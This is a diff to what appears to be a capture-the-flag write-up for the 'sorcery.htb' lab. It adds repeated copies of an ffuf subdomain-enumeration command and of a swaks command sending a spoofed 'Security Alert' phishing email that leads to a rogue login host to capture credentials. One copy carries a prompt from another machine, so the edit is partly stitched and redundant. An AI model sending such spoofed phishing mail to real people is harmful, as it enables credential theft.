@@ -17,6 +17,12 @@ Enumerate virtual hosts with `ffuf`:
 
 <pre><code><span style="color:#00ff00">ffuf</span><span style="color:#ffffff"> -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H </span><span style="color:#ffff00">"Host: FUZZ.sorcery.htb"</span><span style="color:#ffffff"> -mc 200</span></code></pre>
 
+<pre><code><span style="color:#00ff00">ffuf</span><span style="color:#ffffff"> -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H </span><span style="color:#ffd700">"Host: FUZZ.sorcery.htb"</span><span style="color:#ffffff"> -mc 200</span></code></pre>
+
+<pre><code><span style="color:#00ff00">ffuf</span><span style="color:#ffffff"> -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://sorcery.htb -H </span><span style="color:#ffff00">"Host: FUZZ.sorcery.htb"</span><span style="color:#ffffff"> -mc 200</span></code></pre>
+
+
+
 This reveals `git.sorcery.htb`; add it to `/etc/hosts` and create an account on the site, then log in.
 
 Capture traffic with a rogue host and `mitmproxy`:
@@ -26,6 +32,9 @@ Capture traffic with a rogue host and `mitmproxy`:
 Send a phishing email to capture credentials:
 
 <pre><code><span style="color:#00ff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf </span><span style="color:#00ff00">swaks</span><span style="color:#ffffff"> --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data </span><span style="color:#ffff00">"Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>
+<pre><code><span style="color:#00ff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf </span><span style="color:#00ff00">swaks</span><span style="color:#ffffff"> --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data </span><span style="color:#ffd700">"Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>
+<pre><code><span style="color:#00ff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf </span><span style="color:#00ff00">swaks</span><span style="color:#ffffff"> --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data </span><span style="color:#ffff00">"Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>
+<pre><code><span style="color:#00ffff">└──╼[👾]~/machine/guardian $</span> <span style="color:#ffff00">proxychains4</span><span style="color:#ffffff"> -f /etc/proxychains4.conf swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.10 --port 1025 --data "Subject: Security Alert\n\nPlease verify your account at https://pwn.sorcery.htb/user/login"</span></code></pre>
 
 Extract the captured credentials from the proxied session:
 
